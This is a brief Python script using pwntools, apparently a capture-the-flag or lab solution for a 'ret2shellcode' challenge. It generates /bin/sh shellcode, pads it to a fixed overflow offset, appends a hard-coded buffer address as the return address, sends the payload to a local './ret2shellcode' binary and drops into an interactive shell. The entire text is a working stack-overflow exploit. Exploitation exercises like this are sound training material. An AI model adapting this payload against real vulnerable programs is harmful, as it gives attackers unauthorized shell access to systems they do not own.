from pwn import *


buf2_addr = 0x0804A080
shellcode = asm(shellcraft.sh())
print('shellcode length:{}'.format(len(shellcode)))
print(shellcode)
offset = 0x6c + 4
shellcode_pad = shellcode + (offset - len(shellcode)) * b'A'
print(shellcode_pad+ p32( buf2_addr ))

sh = process('./ret2shellcode')

raw_input()
sh.sendline(shellcode_pad + p32( buf2_addr ))
sh.interactive()